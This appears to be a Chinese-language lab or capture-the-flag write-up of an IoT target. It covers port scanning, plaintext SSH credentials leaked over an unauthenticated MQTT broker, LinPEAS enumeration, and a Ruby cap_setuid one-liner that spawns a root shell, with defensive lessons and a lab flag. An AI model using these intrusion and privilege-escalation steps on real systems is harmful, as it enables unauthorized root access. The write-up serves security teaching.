# IoT 靶机渗透笔记

**靶机 IP：** 192.168.101.99  
**靶机系统：** Debian Linux (kernel 6.12.74)  
**难度：** 简单  

---

## 一、信息收集

### 1.1 端口扫描

#### RustScan — 快速端口发现

```bash
rustscan -a 192.168.101.99
```

**扫描结果：**

| 端口 | 服务 | 说明 |
|------|------|------|
| 22/tcp | SSH | 远程登录服务 |
| 1883/tcp | MQTT | IoT 消息协议（Mosquitto） |

**分析：** 靶机仅开放了两个端口。22 端口是常规 SSH，1883 端口是 MQTT（Message Queuing Telemetry Transport）协议，常见于 IoT 设备通信。MQTT 协议本身以明文传输，如果未配置认证，可能泄露敏感信息。

#### Nmap — 服务版本与默认脚本探测

```bash
nmap -sV -sC -p 22,1883 192.168.101.99
```

| 端口 | 服务 | 版本 |
|------|------|------|
| 22/tcp | SSH | OpenSSH 10.0p2 Debian 7+deb13u2 |
| 1883/tcp | MQTT (Mosquitto) | version 2.0.21 |

---

### 1.2 MQTT 信息泄露（关键发现）

Nmap 的 `mqtt-subscribe` 脚本自动订阅了 `$SYS/broker/#` 系统主题，泄露了大量 Broker 运行信息，其中最关键的是：

```
$SYS/broker/version: mosquitto version 2.0.21
```

**以及 —— 明文凭据！**

```
ssh/login: redteam:Pentest123!
```

> 🔑 **漏洞分析：** MQTT Broker 未启用访问控制（ACL），允许匿名用户订阅任意主题。某个客户端（或 Broker 自身）将 SSH 登录凭据以明文形式发布到了 `ssh/login` 主题中。这是典型的 IoT 设备配置不当导致的信息泄露。

**经验总结：**
- MQTT 默认无认证，应始终启用用户名/密码认证
- 不应在 MQTT 消息中明文传输敏感凭据
- `$SYS` 系统主题应限制访问，避免泄露内部运行信息

## 三、权限提升

### 3.1 信息收集（LinPEAS）

上传并运行 LinPEAS 脚本：

```bash
# 本地上传
scp linpeas.sh redteam@192.168.101.99:/tmp/linpeas.sh

# 靶机上执行
chmod +x /tmp/linpeas.sh
/tmp/linpeas.sh > /tmp/lpout.txt

# 下载结果
scp redteam@192.168.101.99:/tmp/lpout.txt ~/Desktop/
```

### 3.2 漏洞发现

LinPEAS 扫描报告中发现：

```
/usr/bin/ruby3.3 capabilities: cap_setuid=ep
```

> 🔑 **漏洞分析：** `cap_setuid=ep` 是一个 Linux Capability，允许程序调用 `setuid()` 等系统调用来修改进程的 UID。`ep` 表示 effective（生效）和 permitted（允许）。Ruby 解释器拥有此能力后，可以直接调用 `Process::Sys.setuid(0)` 将当前进程的 UID 切换为 root (0)。

**关于 Linux Capabilities：**
- Linux 将传统 root 权限拆分为细粒度的 Capability
- `CAP_SETUID` 允许任意切换 UID/GID
- 当一个解释型语言（Ruby/Python/Perl）的可执行文件被设置了此能力，攻击者可以直接编写代码提权
- 这是一个经典的 **GTFOBins** 提权向量

### 3.3 提权执行

```bash
redteam@iot:/tmp$ ruby -e 'Process::Sys.setuid(0); exec "/bin/bash"'
```

一行代码将 UID 设为 0（root），然后用 `exec` 替换当前进程为 root shell。

### 3.4 获取 root.txt

```bash
root@iot:/root# cat root.txt
cb0f023463e47a76f9d69e0b435a10882b6dd7489c5ca4d4b6ccac9c631a46d8
```

✅ **Root Flag 获取成功。**

## 四、攻击链路总结

```
端口扫描 → MQTT 匿名订阅发现明文凭据 → SSH 登录（redteam 用户）
    → LinPEAS 发现 ruby 具有 cap_setuid=ep → Ruby setuid(0) 提权至 root
```

| 阶段 | 技术 | 漏洞类型 |
|------|------|----------|
| 信息收集 | Nmap/RustScan 端口扫描 | — |
| 初始访问 | MQTT 主题订阅 | 信息泄露 / 配置不当 |
| 权限提升 | Ruby `cap_setuid=ep` | 危险的 Linux Capability |
